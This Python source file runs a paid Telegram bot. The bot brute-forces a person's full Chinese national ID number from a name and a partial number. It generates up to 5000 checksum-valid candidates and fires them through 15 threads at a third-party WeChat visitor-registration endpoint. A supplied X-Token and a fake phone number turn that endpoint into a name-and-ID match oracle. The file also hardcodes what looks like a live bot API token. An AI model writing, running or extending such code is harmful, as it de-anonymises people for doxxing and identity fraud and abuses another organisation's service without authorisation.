import telebot
import requests
import time
import re
import threading
import json
import os
import itertools
from telebot import types
from concurrent.futures import ThreadPoolExecutor

# ================= 1. 核心配置 =================
API_TOKEN = '8417331227:AAESrsOPgEDMeu7NHgLMgoZrynkxoafBLBY'
ADMIN_ID = 6649617045 
ADMIN_USERNAME = "@aaSm68"
POINTS_FILE = 'points.json'
TOKEN_FILE = 'token.txt'
DEFAULT_TOKEN = "eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9..." 

bot = telebot.TeleBot(API_TOKEN)
user_states = {} # 存储每个用户的进度
generated_cache = {} 

# --- 数据持久化 ---
def load_data():
    pts = {}
    if os.path.exists(POINTS_FILE):
        try:
            with open(POINTS_FILE, 'r') as f:
                data = json.load(f)
                pts = {int(k): v for k, v in data.items()}
        except: pass
    tk = DEFAULT_TOKEN
    if os.path.exists(TOKEN_FILE):
        try:
            with open(TOKEN_FILE, 'r', encoding='utf-8') as f:
                content = f.read().strip()
                if content: tk = content
        except: pass
    return pts, tk

user_points, CURRENT_X_TOKEN = load_data()

def save_points():
    with open(POINTS_FILE, 'w') as f: json.dump(user_points, f)

def save_token(new_tk):
    with open(TOKEN_FILE, 'w', encoding='utf-8') as f: f.write(new_tk)

def is_valid_id(n):
    if len(n) != 18: return False
    try:
        n = n.upper()
        var = [7, 9, 10, 5, 8, 4, 2, 1, 6, 3, 7, 9, 10, 5, 8, 4, 2]
        var_id = ['1', '0', 'X', '9', '8', '7', '6', '5', '4', '3', '2']
        checksum = sum(int(n[i]) * var[i] for i in range(17)) % 11
        return var_id[checksum] == n[17]
    except: return False

# --- 2. 进度条渲染 ---
def get_ui_bar(done, total):
    percent = int(done / total * 100) if total > 0 else 0
    bar_len = 16 
    filled = int(bar_len * done // total) if total > 0 else 0
    bar = "█" * filled + "░" * (bar_len - filled)
    return f"⌛ **核验中...**\n`[{bar}] {done}/{total} {percent}%`"

# --- 3. 核心核验逻辑 ---
def run_batch_task(chat_id, msg_id, name, id_list, uid):
    global CURRENT_X_TOKEN
    headers = {"X-Token": CURRENT_X_TOKEN, "content-type": "application/json"}
    total, done = len(id_list), 0
    success_match, is_running, stop_signal = None, True, False

    def progress_monitor():
        nonlocal done, is_running
        last_time = 0
        while is_running:
            now = time.time()
            if now - last_time > 2.0:
                try:
                    bot.edit_message_text(chat_id=chat_id, message_id=msg_id, text=get_ui_bar(done, total), parse_mode='Markdown')
                    last_time = now
                except: pass
            time.sleep(0.5)
    
    threading.Thread(target=progress_monitor, daemon=True).start()

    def verify(id_no):
        nonlocal done, is_running, stop_signal, success_match
        if stop_signal or not is_running: return
        try:
            payload = {"id_type": "id_card", "mobile": "15555555555", "id_no": id_no, "name": name}
            r = requests.post("https://wxxcx.cdcypw.cn/wechat/visitor/create", json=payload, headers=headers, timeout=5)
            res = r.json()
            if res.get("code") == 0:
                success_match = (f"✨ **发现成功匹配：**\n"
                                f"{name} `{id_no}` 二要素验证成功✅\n"
                                f"💰 **剩余积分:** {user_points[uid]}")
                stop_signal, is_running = True, False
        except: pass
        finally: done += 1

    with ThreadPoolExecutor(max_workers=15) as executor:
        executor.map(verify, id_list)

    is_running = False
    time.sleep(1) 
    if success_match:
        bot.send_message(chat_id, success_match, parse_mode='Markdown')
    else:
        bot.edit_message_text(chat_id=chat_id, message_id=msg_id, text="❌ 核验完成，未发现匹配结果。")

# ================= 4. 彻底解决“没反应”的指令处理 =================

@bot.message_handler(func=lambda m: m.text and m.text.startswith('/'))
def handle_commands(message):
    uid = message.from_user.id
    # 只要发送指令，无条件清空状态，保证 start 永远有效
    user_states.pop(message.chat.id, None)
    
    text = message.text.strip()
    
    if text.startswith('/start'):
        pts = user_points.get(uid, 0)
        bot.send_message(message.chat.id, f"👋 **核验模式**\n💰 积分: {pts}\n💸 费用: 100/次\n👤 管理员: {ADMIN_USERNAME}\n\n请输入姓名:", parse_mode='Markdown')
        user_states[message.chat.id] = {'step': 'v_name'}

    elif text.startswith('/gen'):
        pts = user_points.get(uid, 0)
        bot.send_message(message.chat.id, f"🛠 **生成模式**\n💰 积分: {pts}\n💸 费用: 50/次\n👤 管理员: {ADMIN_USERNAME}\n\n请输入补全号(x表示未知):", parse_mode='Markdown')
        user_states[message.chat.id] = {'step': 'g_card'}

    elif text.startswith('/add'):
        if uid != ADMIN_ID: return
        try:
            _, tid, amt = text.split()
            user_points[int(tid)] = user_points.get(int(tid), 0) + int(amt)
            save_points()
            bot.reply_to(message, f"✅ 充值成功！用户 `{tid}` 余额: `{user_points[int(tid)]}`")
        except:
            bot.reply_to(message, "格式: `/add 12345 100`")

    elif text.startswith('/set_token'):
        if uid != ADMIN_ID: return
        bot.reply_to(message, "🗝 **请直接发送新的 X-Token 内容:**")
        user_states[message.chat.id] = {'step': 'update_token'}

# ================= 5. 状态机逻辑 (不使用 next_step_handler) =================

@bot.message_handler(func=lambda m: m.chat.id in user_states)
def handle_logic(message):
    uid = message.from_user.id
    state = user_states[message.chat.id]
    text = message.text.strip()

    # 更换 Token 逻辑
    if state['step'] == 'update_token':
        global CURRENT_X_TOKEN
        CURRENT_X_TOKEN = text
        save_token(text)
        bot.send_message(message.chat.id, "✅ Token 已更新生效。")
        user_states.pop(message.chat.id, None)

    # 生成模式：输入卡号
    elif state['step'] == 'g_card':
        user_states[message.chat.id].update({'step': 'g_sex', 'card': text.lower()})
        bot.send_message(message.chat.id, "请输入性别(男/女/未知):")

    # 生成模式：输入性别
    elif state['step'] == 'g_sex':
        if user_points.get(uid, 0) < 50: bot.reply_to(message, "❌ 积分不足"); return
        bot.send_message(message.chat.id, "⌛ **正在计算补全...**")
        char_sets = [list(ch) if ch != 'x' else list("0123456789") for ch in state['card']]
        if text == "男": char_sets[16] = ["1", "3", "5", "7", "9"]
        elif text == "女": char_sets[16] = ["0", "2", "4", "6", "8"]
        ids = [num for res in itertools.product(*char_sets) if is_valid_id(num := "".join(res))][:5000]
        if ids:
            user_points[uid] -= 50; save_points()
            generated_cache[uid] = {'ids': ids}
            with open("铭.txt", "w") as f: f.write("\n".join(ids))
            markup = types.InlineKeyboardMarkup()
            markup.add(types.InlineKeyboardButton("🚀 立即核验 (100积分)", callback_data="start_verify_flow"))
            with open("铭.txt", "rb") as doc:
                bot.send_document(message.chat.id, doc, caption=f"✅ 生成成功！\n💰 余额 `{user_points[uid]}`", reply_markup=markup)
        user_states.pop(message.chat.id, None)

    # 普通核验：输入姓名
    elif state['step'] == 'v_name':
        user_states[message.chat.id].update({'step': 'v_ids', 'name': text})
        bot.send_message(message.chat.id, "请发送列表:")

    # 普通核验：输入列表
    elif state['step'] == 'v_ids':
        if user_points.get(uid, 0) < 100: bot.reply_to(message, "❌ 积分不足"); return
        v_ids = [i for i in re.findall(r'\d{17}[\dXx]', text) if is_valid_id(i)]
        if v_ids:
            user_points[uid] -= 100; save_points()
            msg = bot.send_message(message.chat.id, get_ui_bar(0, len(v_ids)), parse_mode='Markdown')
            threading.Thread(target=run_batch_task, args=(message.chat.id, msg.message_id, state['name'], v_ids, uid)).start()
        user_states.pop(message.chat.id, None)

    # 生成后立即核验姓名输入
    elif state['step'] == 'v_name_after_gen':
        if user_points.get(uid, 0) < 100: bot.reply_to(message, "❌ 积分不足"); return
        user_points[uid] -= 100; save_points()
        msg = bot.send_message(message.chat.id, get_ui_bar(0, 100), parse_mode='Markdown')
        threading.Thread(target=run_batch_task, args=(message.chat.id, msg.message_id, text, generated_cache[uid]['ids'], uid)).start()
        user_states.pop(message.chat.id, None)

@bot.callback_query_handler(func=lambda call: call.data == "start_verify_flow")
def callback_start_verify(call):
    bot.send_message(call.message.chat.id, "👤 请输入要核验的姓名:")
    user_states[call.message.chat.id] = {'step': 'v_name_after_gen'}
    bot.answer_callback_query(call.id)

if __name__ == '__main__':
    bot.infinity_polling(timeout=60, long_polling_timeout=60)
